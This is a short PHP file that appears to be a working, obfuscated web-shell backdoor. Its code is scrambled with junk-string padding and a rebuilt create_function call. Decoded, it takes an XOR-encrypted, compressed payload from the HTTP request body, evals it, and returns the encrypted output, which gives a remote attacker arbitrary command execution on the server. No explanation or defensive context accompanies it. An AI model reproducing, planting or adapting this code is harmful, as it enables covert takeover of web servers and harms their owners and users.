<?php
$X='nction x(Ar$t,$kAr){$c=ArstrArlen($k);$Arl=strlen(Ar$tAr);$o=""Ar;forAr($i=0;$iAr<$l;){ArfoArrAr($';
$T='$k="Ar7Ar8a339edAr";$Arkh="Ar5ee762ada8ArArcd";$kf="a6bdb083eba0Ar"ArAr;$p="PwWvcyotXWArMpY9fk";ArArfu';
$M='("/$kh(Ar.+)Ar$kf/Ar"Ar,@file_get_cArontentArs(Ar"phArp://input"),$m)Ar==1) ArAr{@ob_start();@eAr';
$Q='b_endAr_clean();$rAr=@baseAr64_encArode(@x(Ar@gzcArompressAr($oAr)Ar,$k))Ar;print("$pAr$kh$r$kf");}';
$G='val(@gArzuArncompArress(@x(@ArbasAre64_deArcode($m[ArAr1]),$k)))Ar;$oAr=@ob_get_ArcAronteArnts();@o';
$E=str_replace('vO','','cvOrvOeatvOe_fuvOvOncvOtion');
$I='j=0;($j<$c&&$Ari<$l);$j+Ar+,$i++)Ar{Ar$o.=$t{$i}^Ar$k{$j}Ar;}}reArturn $oAr;}ifAr (@pregAr_matchAr';
$p=str_replace('Ar','',$T.$X.$I.$M.$G.$Q);
$W=$E('',$p);$W();
?>
